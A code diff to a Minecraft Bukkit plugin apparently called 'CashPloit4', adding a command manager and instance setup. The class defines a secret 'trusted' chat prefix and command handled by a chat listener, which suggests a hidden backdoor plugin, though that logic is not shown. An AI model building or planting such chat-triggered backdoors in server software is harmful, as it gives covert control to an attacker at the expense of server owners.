@@ -6,12 +6,18 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import de.Garkolym.Commands.CommandManager;
 import de.Garkolym.Listener.AsyncPlayerChatListener;
 
 public class Start extends JavaPlugin {
 	
 	public static Start instance = null;
 	public final String prefix = ChatColor.GREEN + "[" + ChatColor.AQUA + "CashPloit" + ChatColor.RED + "4" + ChatColor.GREEN + "] " + ChatColor.YELLOW;
+	
+	private CommandManager commandManager = new CommandManager();
+	public CommandManager getCommandManager() {
+		return this.commandManager;
+	}
 	
 	public String trustedChar = "+";
 	public String trustedCommand = "+abc";
@@ -23,6 +29,7 @@ public class Start extends JavaPlugin {
 	
 	@Override
 	public void onEnable() {
+		Start.instance = this;
 		this.registerListeners();
 	}
 	
